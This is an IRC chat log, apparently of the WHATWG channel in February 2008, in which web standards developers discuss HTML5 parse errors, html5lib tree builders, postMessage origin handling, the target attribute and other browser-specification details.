[15:31:00.0000] <Philip`>
http://james.html5.org/cgi-bin/parsetree/parsetree.py?source=%3C!doctype%20html%3Efoo%3Chtml%20x%3E - why is that a parse error?

[15:31:01.0000] <Philip`>
The <html> shouldn't hit the "If this start tag token was not the first start tag token, then it is a parse error." case since it is the first start tag token

[15:32:00.0000] <gsnedders>
jgraham: if I allow other dom modules to be used for the dom treebuilder/walker, I assume I should just add a second param (like on etree), and have it default to minidom for backwards compat.?

[15:33:00.0000] <gsnedders>
Should I just commit it as long as it doesn't break anything?

[15:33:01.0000] <Philip`>
http://parsetree.validator.nu/?doc=http://philip.html5.org/misc/html-after-chars.html complains too, and I think it shouldn't

[15:34:00.0000] <gsnedders>
(someone who isn't jgraham who knows about html5lib policy can answer too)

[15:34:01.0000] <jgraham>
gsnedders: Exactly

[15:34:02.0000] <jgraham>
I think I even wrote in the docs that that might happen in the future

[15:34:03.0000] <gsnedders>
yeah, you did

[15:34:04.0000] <annevk>
Philip`, with implied start tag tokens it's not

[15:35:00.0000] <jgraham>
gsnedders: You should add the new dom thing to the tests as well. Then check they all pass :)

[15:35:01.0000] <gsnedders>
jgraham: add in what way?

[15:36:00.0000] <gsnedders>
jgraham: add param for mindom?

[15:36:01.0000] <jgraham>
In the tokenizer tests file we run all the tests on every DOM implementation we claim to support, if the user has them installed

[15:36:02.0000] <Philip`>
annevk: That would be annoying for me, since implied tokens are handled in the same way as reprocess-the-current-token tokens, and the <html> gets reprocessed a couple of times before it's tested for firstness

[15:37:00.0000] <Philip`>
and the spec isn't clear enough about what it means there, so I'll stick with my interpretation because it's easy

[15:37:01.0000] <annevk>
either way there's a parse error there

[15:37:02.0000] <annevk>
i guess it's ok if you collapse them, but Hixie should clarify that

[15:37:03.0000] <Philip`>
and http://canvex.lazyilluminati.com/misc/cgi/issues.cgi/message/%3C251FD893-EFFA-4A53-9015-21349E494B74%40iki.fi%3E should allow it to work better in the future anyway

[15:37:04.0000] <Philip`>
annevk: I'm not sure why there's a parse error either way

[15:38:00.0000] <gsnedders>
jgraham: where?

[15:38:01.0000] <annevk>
Philip`, oh wait... hmm

[15:38:02.0000] <jgraham>
gsnedders:

[15:38:03.0000] <jgraham>
try:

[15:38:04.0000] <jgraham>
    import pyxdom

[15:38:05.0000] <jgraham>
    treeTypes["pyxdom"] = treebuilders.getTreeBuilder("dom", "pyxdom")

[15:38:06.0000] <jgraham>
except ImportError:

[15:38:07.0000] <jgraham>
    pass

[15:38:08.0000] <annevk>
Philip`, there should be a parse error there though

[15:38:09.0000] <gsnedders>
jgraham: what file?

[15:39:00.0000] <jgraham>
in python/tests/test_parser.py

[15:39:01.0000] <Philip`>
annevk: Do you mean there should be one according to the spec, or there should be one according to common sense?

[15:39:02.0000] <gsnedders>
/me will probably have a go tomorrow

[15:39:03.0000] <annevk>
Philip`, currently only the latter I guess

[15:39:04.0000] <Philip`>
/me wonders if he should bother emailing about it

[15:41:00.0000] <annevk>
it's also easier to handle this case if you turn insertion modes into phases

[15:41:01.0000] <Philip`>
/me does that in his implementation

[15:42:00.0000] <annevk>
in that you can never end up with <html> in the in body phase

[15:51:00.0000] <Philip`>
/me continues hating things that require more than one token at a time


2008-02-12
[16:30:00.0000] <Hixie>
/me wonders whether to make Storage.setItem() throw or not after all

[17:42:00.0000] <Hixie>
http://www.hixie.ch/specs/dom/messages/0.9 <-- proposal for a spec for sending messages between end points, including sending end points along

[17:56:00.0000] <roc>
uh oh

[17:56:01.0000] <roc>
you've invented the pi calculus!

[17:56:02.0000] <Hixie>
oops

[17:56:03.0000] <Hixie>
i didn't mean to invent anything!

[17:59:00.0000] <Hixie>
oops, behind schedule. gotta go. back in a bit.

[18:55:00.0000] <AwayEagle>
roc: not enough greek letters

[19:58:00.0000] <inimino>
what's the reason for target=_blank not being conforming in the current draft?

[19:59:00.0000] <inimino>
is it to discourage people from trying to open new windows like that?

[20:04:00.0000] <inimino>
because the consensus in Web-developer-land seems to be that you should use JavaScript to add them back in...

[20:20:00.0000] <Hixie>
using javascript to add them back in is just as invalid as having them in in thefirst place

[20:20:01.0000] <Hixie>
the correct thing to do is to not set target="", and let the user decide on his own what to do with links

[20:21:00.0000] <Hixie>
inimino: ^

[20:21:01.0000] <SadEagle>
that sounds awfully polite for a website to do

[20:22:00.0000] <Hixie>
shocking, i know

[20:23:00.0000] <inimino>
Hixie: I agree, I'm just seeing people using the JavaScript approach anyway and I'm wondering if that's actually worse than just allowing it

[20:24:00.0000] <Hixie>
why would it be worse?

[20:26:00.0000] <inimino>
I was going to say it's harder for the user to configure how it's handled, but that's probably not true

[20:27:00.0000] <inimino>
though there are people using window.open(), which seems like it might be less configurable

[20:28:00.0000] <Hixie>
it's all the same code in the browser in the end

[20:28:01.0000] <inimino>
right

[20:29:00.0000] <inimino>
too bad people validate the markup and not the DOM ;-)

[20:29:01.0000] <Hixie>
yeah

[20:30:00.0000] <Hixie>
would be nice for there to be scripting-aware validators

[20:30:01.0000] <inimino>
yeah

[20:33:00.0000] <MikeSmith>
news about a new Webkit-based browser for mobile devices

[20:33:01.0000] <MikeSmith>
http://torchmobile.com/press/

[20:34:00.0000] <MikeSmith>
Iris Browser

[20:34:01.0000] <MikeSmith>
George Staikos's company

[20:35:00.0000] <MikeSmith>
product page mentions HTML5 and canvas

[20:35:01.0000] <MikeSmith>
http://torchmobile.com/products/

[20:35:02.0000] <SadEagle>
I don't think people involved in QtWebKit want to mention canvas :-)

[20:39:00.0000] <MikeSmith>
SadEagle - why's that? implementation of canvas on Qt port not work so good?

[20:40:00.0000] <SadEagle>
MikeSmith: last I checked, "not so good" would be quite an understatement.

[20:42:00.0000] <MikeSmith>
damn. I want me some canvas on mobile

[20:47:00.0000] <SadEagle>
may be someone can make a khtml4.0.1 build of konqueror/embedded :-)

[20:50:00.0000] <SadEagle>
I am sure it works pretty well. And the basics of canvas will work, too, but not things like arcs and shadows.

[21:16:00.0000] <Hixie>
so it ironically sucks that we now have multiple implementations of postMessage()

[21:16:01.0000] <Hixie>
as the ideal way of fixing some of the problems with it would involve minor (but incompatible) changes to how it works

[21:18:00.0000] <Hixie>
i don't suppose adam barth is here?

[21:18:01.0000] <Hixie>
jwalden: i assume we consider it too late to dramatically change postMessage() at this point?

[21:19:00.0000] <jwalden>
Hixie: depends on what "dramatically" means; adding the extra args suggested for better targeting would be simple enough, createMessageReceiver might be harder, reply() would be easy, I think

[21:20:00.0000] <Hixie>
well my ideal solution would be to change postMessage() from what it is now to being something that creates two endpoints as defined here: http://hixie.ch/specs/dom/messages/0.9

[21:20:01.0000] <Hixie>
jwalden: which solves all the problems neatly

[21:20:02.0000] <Hixie>
but i understand if that's too drastic

[21:23:00.0000] <Hixie>
i'm tempted to say that we should solve these problems by just waiting til we introduce end points

[21:23:01.0000] <jwalden>
sec, fighting fire on a tinderbox

[21:23:02.0000] <Hixie>
hehe

[21:24:00.0000] <Hixie>
then the solution would be, you postMessage() a hello, then the other side checks the origin and if it likes it, postMessage()s you an ack with an endpoint, and then you check the origin yourself, and if you like it, you use the end points to communicate

[21:29:00.0000] <jwalden>
so, my first reaction is this interface is waaay too complicated

[21:33:00.0000] <jwalden>
second, the whole numbering thing just confuses me

[21:33:01.0000] <jwalden>
and I've implemented Unix pipes before in a toy kernel

[21:34:00.0000] <jwalden>
I don't think you want to bring the pipe model into the picture here, to be honest

[21:36:00.0000] <jwalden>
I think there's far more potential for confusion with this API than with one in which it's plain and simple message-passing, perhaps with builtin filtering mechanisms at both ends

[21:41:00.0000] <jwalden>
and in the end, yes, I'm pretty sure this would be too drastic not just for Mozilla but for Opera and likely WebKit as well

[23:00:00.0000] <Hixie>
jwalden: yeah i figured it would be too much change at this stage

[23:01:00.0000] <Hixie>
jwalden: the real question is whether it's a bad idea to use this on the long term as a solution for the issues raised

[23:01:01.0000] <Hixie>
jwalden: (i'm not sure what's complicated about the proposal, are we talking about the same thing? this is a pretty trivial api)

[23:20:00.0000] <webben_>
Hixie: re target, I'd tend to agree that websites should let users open links as they want, although sometimes you'd want to open a new browsing context to avoid losing application state (i.e. don't lose the users data opening a link in a multipage tax form). I think there are at least three advantages to target over window.open: it's declarative so you can easily make UI to distinguish such links (iCab does IIRC), it's simpler to author, and if 

[23:21:00.0000] <webben_>
The biggest argument against target in particular (as opposed to against opening new windows in general) is that it shifts application behavior into a document markup layer, but HTML5 does so much of that it hardly seems like a relevant argument.

[23:24:00.0000] <jeremyb>
also, if i have a legit small popup open and something in the popup or an external app triggers a new page open i want the new tab to be on the main win not the popup.  (fe, media player)

[23:25:00.0000] <jeremyb>
so maybe allow specifying that a window isn't available for new tabs unless explicitly requested by user

[23:25:01.0000] <webben_>
I guess it's worth remembering that plenty of content will continue to be pulled in via iframe, and need target="_top" if it wants to transition the user away from the host page.

[23:25:02.0000] <jeremyb>
(no idea if this is already covered by a spec but i've been bitten by it a few times recently with different sites)

[23:26:00.0000] <webben_>
target's horrible and basically bad practice, but it seems to be useful in certain limited but real circumstances

[23:26:01.0000] <jeremyb>
/me scratches head

[23:26:02.0000] <jeremyb>
you need to use target=_top for an iframe?

[23:26:03.0000] <jeremyb>
/me makes testcase

[23:26:04.0000] <webben_>
I think if you have a form in the iframe you do.

[23:26:05.0000] <webben_>
(at least)

[23:27:00.0000] <webben_>
it came up in #javascript the other day for someone making a facebook app

[23:27:01.0000] <jeremyb>
/me sees not any reason why a form would make a diff

[23:27:02.0000] <webben_>
That's why I say "at least".

[23:30:00.0000] <webben_>
it might be interesting to see if UAs could detect when state is being stored or when they're in a frame/popup context, and use that to determine whether to obey the command to open a new window

[23:31:00.0000] <webben_>
yep, a quick test shows it applies to A as well as FORM.

[23:38:00.0000] <jeremyb>
yup, webben_'s right

[23:38:01.0000] <jeremyb>
data:text/html,<!doctype html><p>lskfjlakj-lskjf</p> <iframe src="data:text/html,<a%2520href=%2522http://www.google.com%2522>lksjflkj</a>"></iframe>

[23:53:00.0000] <webben_>
ah looks like the current draft actually allows for _top etc: 'The base element can now have a target attribute as well mainly for consistency with the a element and because it was already widely supported. Also, the target attribute for the a and area elements is no longer deprecated, as it is useful in Web applications, for example in conjunction with iframe.'

[23:53:01.0000] <webben_>
http://www.w3.org/TR/html5-diff/#new-attributes

[02:07:00.0000] <Philip`>
/me sees that http://www.angelfire.com/tx/rangerexes/heritage.htm really doesn't work very well in Opera (9.2 or 9.5)

[02:08:00.0000] <annevk>
<table> :(

[02:08:01.0000] <annevk>
oh, and it's not centered in IE

[02:11:00.0000] <annevk>
so Firefox renders everything before <table>

[02:12:00.0000] <annevk>
but it's still centered then

[03:51:00.0000] <Philip`>
/me thinks more tree construction tests are needed, given that his code is full of 'XXX' and 'TODO' comments but still passes the current test cases

[03:53:00.0000] <Dashiva>
Philip`: Maybe there should be a list of such todos somewhere so it's easy to find out which testcases need writing

[03:55:00.0000] <Philip`>
I'm just trying to fill in the gaps myself at the moment - if I wrote down a list, I'd forget what anything meant by the time I looked at it again :-)

[04:00:00.0000] <annevk>
Philip`, awesome

[04:00:01.0000] <annevk>
we wrote our code and later added some tests on top of the 71 hixie made but that's it

[04:00:02.0000] <annevk>
then henri added some and we fixed some more bugs, mostly in unicode handling

[04:01:00.0000] <Philip`>
/me 's implementation only handles ASCII :-(

[04:01:01.0000] <annevk>
reminds me of arc

[04:12:00.0000] <virtuelv>
annevk: :)

[04:12:01.0000] <annevk>
"SVGSVGTextElement.getNumberOfChars() counts UTF-16 surrogates as separate characters"

[04:13:00.0000] <roc_>
mmmm

[04:13:01.0000] <annevk>
given that various languages already have surrogates build in, maybe SVG should follow?

[04:13:02.0000] <Dashiva>
The SVGSVG prefix seems accident-prone

[04:13:03.0000] <annevk>
(failure for test 69 in Opera)

[04:13:04.0000] <annevk>
(in Acid3)

[04:43:00.0000] <hsivonen>
annevk: the DOM is pretty deeply in the territory of counting UTF-16 code units

[04:43:01.0000] <hsivonen>
annevk: and too late to fix

[04:48:00.0000] <Philip`>
http://james.html5.org/cgi-bin/parsetree/parsetree.py?source=%3C!doctype%20html%3E%3Ctable%3E%3Cp%3E%3C/table%3E - the </table> should generate implied end tags, which should imply a </p>, which should cause a table-voodoo error

[04:49:00.0000] <Philip`>
/me doesn't know if that can have a more significant effect than a lack of error

[05:11:00.0000] <annevk>
hsivonen, right, does it make sense for SVG to be different?

[05:12:00.0000] <hsivonen>
annevk: oh it's different? no, that doesn't make sense at all

[05:41:00.0000] <zcorpan_>
hmm. is it defined anywhere in the html5 spec that elements implement appropriate interfaces when put in the dom by the xml processor? or elements created with createElementNS?

[05:42:00.0000] <zcorpan_>
i note that the html5 parser says that elements should implement the appropriate interfaces

[05:43:00.0000] <zcorpan_>
perhaps it should be defined in a higher layer? like "when an element is created and it is in the html namespace, it must implement the appropriate interfaces..." or some such

[05:45:00.0000] <Lachy>
zcorpan_, since HTML5 is defined in terms of the DOM, it doesn't matter where the elements come from, they still implement the DOM APIs

[05:46:00.0000] <zcorpan_>
Lachy: so why is there a requirement in the parser about elements implementing appropriate interfaces?

[05:46:01.0000] <Lachy>
I don't know

[05:46:02.0000] <Lachy>
seems kind of redundant

[05:46:03.0000] <hsivonen>
zcorpan_: I think the spec needs to say that XML stuff needs to implement the right stuff

[06:48:00.0000] <annevk>
hsivonen, is there a summary somewhere of how DOM and ECMAScript assume UTF-16?

[07:13:00.0000] <annevk>
defining it at an intermediate layer seems cleaner to me

[08:18:00.0000] <gsnedders>
/me lets his frustration out at the httpbis wg

[08:21:00.0000] <gsnedders>
<http://lists.w3.org/Archives/Public/ietf-http-wg/2008JanMar/0227.html>

[08:23:00.0000] <Philip`>
/me now has 2000 lines of generated JavaScript to implement a tree constructor

[08:24:00.0000] <Philip`>
though unfortunately most of the lines say things like debug("TODO: ReprocessAsIf"); because I haven't implemented them yet :-(

[08:25:00.0000] <SadEagle>
gsnedders: User-Agents MUST ignore the user preferences? That's a nice one. 

[08:25:01.0000] <SadEagle>
/me wonders whether someone has stats on wrong content-type w/in http headers. He surely has seen it with http-equiv

[08:25:02.0000] <gsnedders>
SadEagle: most of what the HTTPbis WG is working on is totally idealistic and backwards incompatible (well, compatible with conforming impls. of RFC2616, if there are any)

[08:26:00.0000] <gsnedders>
SadEagle: content-type or charset?

[08:26:01.0000] <gsnedders>
SadEagle: charset's not that widespread. The issue is with implicit charsets (like on text/xml)

[08:27:00.0000] <SadEagle>
I meant charset within content-type.

[08:27:01.0000] <gsnedders>
yeah, if it is explicitly given, it's normally right (except for one or two things, like ISO-8859-1 and GB2302)

[08:28:00.0000] <gsnedders>
(not GB2302, GB2312)

[08:29:00.0000] <annevk>
text/xml doesn't have explicit charsets

[08:29:01.0000] <annevk>
see RFC 3023

[08:29:02.0000] <annevk>
(within the file, that is)

[08:29:03.0000] <annevk>
/me -> food

[08:30:00.0000] <gsnedders>
annevk: I mean on the actual MIME type

[08:30:01.0000] <gsnedders>
(i.e., parameters on the MIME type

[08:31:00.0000] <SadEagle>
well, I've seen e.g. <meta http-equiv="content-type:text/html;charset=utf-16"> .... encoded as ASCII. Also koi8/cp1251 messups. Now, w/meta one can claim it's html that defines it anyway, but still, I would expect the sequence in case of a misconfigured server to be:

[08:31:01.0000] <gsnedders>
SadEagle: that's specific to HTML, though. I'm talking in general HTTP terms. UTF-16 in meta@charset must be ignored

[08:32:00.0000] <SadEagle>
1) User open a webpage, sees garbage. 2) User activates encoding auto-detection, which picks the right decoding. 3) The user keeps browsing the webpage with auto-detection (or manualyl chosen charset) "sticky", and has no problem. It seems to me that the proposal would require the user to repeat (2) every time they navigate. 

[08:33:00.0000] <gsnedders>
yeah, it would

[09:04:00.0000] <zcorpan_>
hsivonen: v.nu says that <p/> is an html4-only error

[09:34:00.0000] <zcorpan_>
hsivonen: it seems that your encoding declaration warnings have gone amok: http://validator.nu/?doc=http%3A%2F%2Fvalidator.w3.org%2F

[09:38:00.0000] <Hixie>
webben: target=_top is allowed, it's only _blank that isn't.

[09:39:00.0000] <zcorpan_>
/me notes that v.w.o has "Group Error Messages by type"

[09:39:01.0000] <webben>
Hixie: Thanks, I did note that. :)

[10:20:00.0000] <hsivonen>
zcorpan_: oops. thanks

[10:22:00.0000] <gsnedders>
/me is feeling very naïve at the moment

[10:22:01.0000] <gsnedders>
/me knows nowhere near enough about Python

[10:38:00.0000] <hsivonen>
zcorpan_: fixed. thanks

[11:52:00.0000] <Hixie>
jwalden: yt?

[11:53:00.0000] <jwalden>
Hixie: sorta; you caught me just before a phone conference actually :-)

[11:54:00.0000] <Hixie>
i just made a change to MessageEvent/postMessage() for security that fixed a separate problem from the one that was raised earlier

[11:54:01.0000] <Hixie>
i'm about to send mail to whatwg explaining it

[11:54:02.0000] <Hixie>
annevk: see above also

[11:54:03.0000] <Hixie>
basically changing message.domain and message.uri to just message.origin

[11:54:04.0000] <Hixie>
which is what the .uri value used to be, but without the path

[11:55:00.0000] <jwalden>
hm

[11:55:01.0000] <jwalden>
I await the explanation!

[11:55:02.0000] <Hixie>
:-)

[11:57:00.0000] <Hixie>
sent

[12:12:00.0000] <jwalden>
nice catch on username/password; I should have thought of that in my testing

[12:12:01.0000] <jwalden>
I *did* think of it once you summarized the change above, tho :-)

[12:12:02.0000] <Hixie>
:-)

[12:12:03.0000] <Hixie>
i think this, as a sideeffect, will simplify addressing one of the other problems

[12:13:00.0000] <Hixie>
instead of postMessage(message, [domain, [uri]]); we can just have postMessage(message, [origin]);

[12:13:01.0000] <jwalden>
so everything before the path, *except* for username/password, then

[12:13:02.0000] <Hixie>
yeah

[12:13:03.0000] <Hixie>
(and later make it postMessage(message, [endPoint], [origin]), since those two are type-distinguishable)

[12:29:00.0000] <aroben>
Hixie: what commit did this change occur in? I can't find it in the tracker

[12:29:01.0000] <jwalden>
I sent my response

[12:30:00.0000] <aroben>
/me is writing a bug report for WebKit and wants to link to the change

[12:30:01.0000] <jwalden>
I'll note that I originally wanted .domain to always include a port number, which would have avoided the first problem even if I'd never have noticed that we'd avoided it  :-P

[12:30:02.0000] <jwalden>
and I definitely wouldn't have noticed the first problem

[12:31:00.0000] <jwalden>
I'm still a bit chagrined I missed the second

[12:31:01.0000] <jwalden>
GAAAAH

[12:32:00.0000] <jwalden>
/me gets bitten by forgetting +whatwg AGAIN

[12:36:00.0000] <gsnedders>
/me bits jwalden 

[12:36:01.0000] <jwalden>
?

[12:36:02.0000] <gsnedders>
*bites

[12:37:00.0000] <gsnedders>
jgraham: I took a good look at the treebuilders today, and I really can't work out how the etree stuff works.

[12:37:01.0000] <jgraham_>
gsnedders: By magic :)

[12:38:00.0000] <gsnedders>
:)

[12:38:01.0000] <gsnedders>
(i.e., I can't get DOM to work in a similar way)

[12:38:02.0000] <jgraham_>
What do you actually want to know?

[12:38:03.0000] <gsnedders>
I just don't really understand how the etree stuff works _at all_.

[12:39:00.0000] <gsnedders>
as in, how it works out what etree impl to use from the second param to getTreeBuilder

[12:40:00.0000] <jgraham_>
So, from memory, we do something like create a module-like object at runtime with a module-level variable ElementTree set to the module of the Element Tree implementation that we're using

[12:41:00.0000] <gsnedders>
what does getETreeBuilder() do?

[12:41:01.0000] <jgraham_>
/me decides looking t the code would help

[12:41:02.0000] <gsnedders>
what's **kwargs?

[12:42:00.0000] <gsnedders>
heck, what does *arg and **arg mean?

[12:42:01.0000] <webben>
it's different ways of passing arguments in Python

[12:42:02.0000] <webben>
IIRC kwargs is named parameters

[12:42:03.0000] <webben>
can't remember the difference between *arg and **arg

[12:43:00.0000] <jgraham_>
*args means take the tuple args and expand its value as a set of arguments to a function 

[12:43:01.0000] <gsnedders>
ah

[12:44:00.0000] <jgraham_>
so something like func(*(True, 3)) calls func with the args True and 3

[12:44:01.0000] <gsnedders>
and ** is reference?

[12:44:02.0000] <jgraham_>
similarly **kwargs expands a dict kwargs as a set of named parameters to a function

[12:44:03.0000] <gsnedders>
ah

[12:44:04.0000] <jwalden>
Hixie: you didn't update initMessageEvent(NS)?

[12:44:05.0000] <gsnedders>
then how do you pass by reference?

[12:45:00.0000] <jgraham_>
so func(**{"foo":True, "bar":3}) == func(foo=True, bar=3)

[12:45:01.0000] <jgraham_>
gsnedders: You don't

[12:45:02.0000] <gsnedders>
yeah. that makes sense.

[12:45:03.0000] <gsnedders>
jgraham_: ah.

[12:45:04.0000] <gsnedders>
jgraham_: that's simple.

[12:45:05.0000] <jgraham_>
or rather, you always pass by _object_

[12:45:06.0000] <gsnedders>
now, back to treebuilders

[12:48:00.0000] <jgraham_>
so something like "a = [1,2]; func = lambda x:x.append(3);func(a);print a" will print [1,2,3]

[12:48:01.0000] <gsnedders>
ya

[12:51:00.0000] <jgraham_>
gsnedders: So, getETreeBuilder is like a function to return a set of functions which are all closures over the value of  ElementTreeImplementation

[12:52:00.0000] <jgraham_>
notice the return locals() at the end

[12:52:01.0000] <jgraham_>
those functions are turned into a module on the fly in getEtreeModule

[12:53:00.0000] <jgraham_>
This is kinda icky but I wasn't sure how else to reuse all the code for multiple etree implementations

[12:53:01.0000] <jgraham_>
/me has to go eat now, will be back later

[12:54:00.0000] <gsnedders>
Hixie: you have <code title""> in html5, what's this meant to be?

[12:54:01.0000] <gsnedders>
(or is my in-head parser not got some quirky error handling?)

[12:55:00.0000] <gsnedders>
Hixie: (see "<p>For the purposes of the interaction of HTML with Selectors' <code")

[13:02:00.0000] <gsnedders>
/me throws this proposal for recreating toc(1) and num(1) out the window for being far too expensive

[13:04:00.0000] <gsnedders>
Hixie: that is per HTML 5 seemingly an empty title"" attribute. I guess you didn't mean that :)

[13:15:00.0000] <Philip`>
Is there some way I can construct a DOM element using JS so it has an attribute called something like title"" without throwing exceptions?

[13:16:00.0000] <Philip`>
I can't make a very good HTML parser if there's no way to construct the things that are parsed :-(

[13:16:01.0000] <blooberry>
can you use String.fromCharCode?

[13:17:00.0000] <Philip`>
The problem is just when trying to pass the string into setAttribute

[13:17:01.0000] <blooberry>
it throws an exception in that case?

[13:18:00.0000] <Philip`>
In Firefox 2, yes

[13:18:01.0000] <Philip`>
(In Opera 9.5, no)

[13:18:02.0000] <Philip`>
(In Safari 3, yes)

[13:19:00.0000] <Philip`>
presumably because it's a totally bogus attribute name

[13:23:00.0000] <SadEagle>
It should.

[13:24:00.0000] <jgraham_>
gsnedders: Did any of that help?

[13:24:01.0000] <gsnedders>
jgraham_: I'm still in the middle of finishing off an email :P

[13:24:02.0000] <gsnedders>
(ironically, this one email is probably longer than the total amount of writing I've done at school over the past two days)

[13:30:00.0000] <jwalden>
hm

[13:31:00.0000] <jwalden>
isn't this domain hazard also common to document.domain as well?

[13:31:01.0000] <gsnedders>
OK, now what jgraham_ said

[13:51:00.0000] <Hixie>
jwalden: as i understand it, doc.domain doesn't allow you to cross ports or schemes

[13:52:00.0000] <jwalden>
Hixie: I could have sworn Mozilla did differently last time I looked

[13:52:01.0000] <Hixie>
ah

[13:56:00.0000] <gsnedders>
jgraham_: OK, that makes sense now.

[13:56:01.0000] <gsnedders>
(no, it didn't take 20 minutes, I went and procrastinated)

[13:57:00.0000] <gsnedders>
From the looks of things, it'd be simplest to just do the same as etree does

[13:57:01.0000] <gsnedders>
Though it looks like the only thing that'll change for each DOM impl is the TreeBuilder class itself

[13:59:00.0000] <gsnedders>
Or rather, that's the only one that needs to reference the actual impl.

[14:11:00.0000] <met_>
Has any browser implemented datagrid already?

[14:11:01.0000] <met_>
/me is trying nigthtly build without success

[14:13:00.0000] <jgraham_>
met_: not as fr as I know

[14:13:01.0000] <jgraham_>
s/fr/far/

[14:14:00.0000] <jgraham_>
/me wonders how much effort it would be to implement in js

[14:14:01.0000] <met_>
thx, it looks same for me

[14:14:02.0000] <met_>
preparing some examples for html5 presentation and some datragrid example should be nice and powerfull 8-)

[14:15:00.0000] <met_>
but I have nowhere to check it

[14:18:00.0000] <gsnedders>
jgraham_: would you say just chucking everything in dom.py into a function, like etree.py, would be the best way to go about it?

[14:19:00.0000] <gsnedders>
brb

[14:20:00.0000] <jgraham_>
gsnedders: I don't like to make claims about best :) But consistency is good and if we decide the whole design sucks later it's easier to change two similar things than two different things

[14:20:01.0000] <zcorpan_>
Philip`: no, you can't (re title"")

[15:00:00.0000] <gsnedders>
jgraham: I'll try and impl it tomorrow

[15:41:00.0000] <annevk>
Hixie, as far as I can tell event listeners are asynchronous which means that the UA could decide to not run process them directly but instead process some code further on...

[15:45:00.0000] <Hixie>
event listeners are synchronous.

[15:45:01.0000] <Hixie>
as in, when you dispatch an event, everything from that point to when it returns is synchronous

[15:45:02.0000] <Hixie>
see dom2 events

[15:45:03.0000] <annevk>
i guess i'll admit defeat

[15:45:04.0000] <annevk>
/me wonders why everyone fails

[15:50:00.0000] <Hixie>
if nobody allows click() to nest, i can remove the test

[15:50:01.0000] <Hixie>
iirc, at least one browser nested at least once

[15:51:00.0000] <annevk>
could be

[15:54:00.0000] <Philip`>
/me sees that http://blogs.msdn.com/ie/archive/2008/01/21/compatibility-and-ie8.aspx has reached exactly 666 comments

[15:55:00.0000] <Philip`>
It seems a bit odd that it's generated more noise than the Acid 2 post

[15:55:01.0000] <Hixie>
why?

[15:55:02.0000] <Hixie>
microsoft has an image problem. people aren't going to be pro-ms until they have proven over years of not being evil that they are in fact good.

[15:56:00.0000] <Hixie>
acid2 is a small step in the right direction. the compatibility meta header is a giant step backwards.

[15:56:01.0000] <billmason>
I love the suggestion in the thread that any unknown doctype be rendered as XHTML 1.1.  I think I'll stop reading the noise now.

[15:58:00.0000] <Philip`>
Hmm, okay, maybe it's not actually odd :-)


2008-02-13
[16:01:00.0000] <annevk>
Hixie, should access control and postMessage() align formats for origin etc?

[16:01:01.0000] <annevk>
(actually, the answer is yes, so we should probably resolve it...)

[16:03:00.0000] <Hixie>
scheme://hostname:port

[16:03:01.0000] <Hixie>
it's just the uri format without a path

[16:05:00.0000] <annevk>
the differences were that your proposed format included a trailing slash and omitted the default port 

[16:05:01.0000] <annevk>
from a very brief scan

[16:05:02.0000] <annevk>
/me hasn't actually checked the spec though

[16:05:03.0000] <annevk>
/me just the e-mail

[16:07:00.0000] <annevk>
sees that the spec doesn't have the trailing slash but does omit the default port

[16:08:00.0000] <Hixie>
yeah, i don't figure most people will include the port

[16:09:00.0000] <annevk>
ok, I suppose I could make that change to Access-Control-Origin

[16:10:00.0000] <annevk>
access-item is already flexible enough (does not allow / though)

[16:10:01.0000] <Hixie>
the / is part of the path

[16:10:02.0000] <annevk>
right

[16:10:03.0000] <annevk>
i was wondering whether to allow a trailing slash for copy & paste friendlyness

[16:11:00.0000] <Hixie>
well, postMessage() actually allows the entire URI

[16:11:01.0000] <Hixie>
it just ignores the path

[16:11:02.0000] <Hixie>
and it doesn't include it in event.origin, though that's poorly defined right now

[16:12:00.0000] <annevk>
k, i'm not going to change that for access-item

[16:15:00.0000] <annevk>
Hixie, maybe you should use the same syntax as access-item...

[16:16:00.0000] <Hixie>
annevk: elaborate?

[16:18:00.0000] <annevk>
for the second argument of postMessage()

[16:18:01.0000] <Hixie>
i mean, elaborate on what you would want changed in the syntax :-)

[16:18:02.0000] <Hixie>
right now, it's just a plain old uri/iri

[16:18:03.0000] <annevk>
so you can use postMessage("...", "example.org")

[16:19:00.0000] <Hixie>
oh

[16:19:01.0000] <Hixie>
why?

[16:19:02.0000] <Hixie>
that just seems like asking for confusion...

[16:19:03.0000] <Hixie>
i guess i'd recommend that access-item be simplified too :-)

[16:21:00.0000] <annevk>
hmm

[16:22:00.0000] <Hixie>
(in particular, i may just make postMessage("...", "example.org") resolve the uri locally instead of throwing an exception)

[16:23:00.0000] <annevk>
oh, and postMessage("...", "*.example.org") would work

[16:24:00.0000] <Hixie>
that would make it way more complex

[16:24:01.0000] <annevk>
probably not so relevant for postMessage, indeed

[16:24:02.0000] <Hixie>
99% of the time, you'll just do postMessage("...", e.origin);

[16:24:03.0000] <Hixie>
to prevent sending messages to new hosts

[16:24:04.0000] <Hixie>
and on the long run, you'll use endPoints, anyway

[16:25:00.0000] <Hixie>
and just use postMessage() to set up the original connection

[16:28:00.0000] <annevk>
suggestions for simplifying access-item are welcome on public-appformats btw :)

[16:29:00.0000] <Philip`>
Hmph, Opera (9.5) apparently doesn't let me add a doctype to a document

[16:29:01.0000] <Dashiva>
Opera only supports ninja doctypes

[16:30:00.0000] <Philip`>
Uhhh

[16:33:00.0000] <Philip`>
/me makes it add a comment instead of a doctype

[16:37:00.0000] <annevk>
/me -> bed

[16:37:01.0000] <Philip`>
Also, Opera deletes "--" from inside comments

[16:39:00.0000] <Philip`>
http://software.hixie.ch/utilities/js/live-dom-viewer/?%3C!DOCTYPE%20html%3E%0D%0A%3Cbody%3E%0D%0A%3Cscript%3Edocument.body.appendChild(document.createComment('a-b--c---d----e'))%3C%2Fscript%3E

[16:39:01.0000] <Philip`>
Looks like an Opera bug

[16:52:00.0000] <Hixie>
does anyone have anything they'd like me to prioritise?

[16:56:00.0000] <chrismurf>
No, but thank you for asking :-)

[16:58:00.0000] <Philip`>
Someone should make something like JSON that can handle 'var x=[];x[0]=x'

[17:22:00.0000] <kingryan>
Philip`:  yaml can probably do that

[17:25:00.0000] <Philip`>
I think YAML has "&label" and "*label" to mark and refer to bits of structure when you want non-trees, and it seems to be quite handy when writing by hand

[17:25:01.0000] <Philip`>
(I've no idea how useful or ugly it is when automatically serialising, though)

[17:29:00.0000] <Philip`>
(But YAML is too crazy and complex to be used where interoperability matters - the spec is a hundred pages long)

[17:31:00.0000] <Hixie>
so should U+0085 NEXT LINE (NEL) be a space character in html5?

[17:31:01.0000] <Hixie>
i'm thinking no.

[17:33:00.0000] <Philip`>
I'd like no because then I could pass UTF-8 through my ASCII parser and it'd still work alright

[17:34:00.0000] <Hixie>
/me is randomly replying to feedback from random folders

[17:36:00.0000] <Dashiva>
Pick me, pick me!

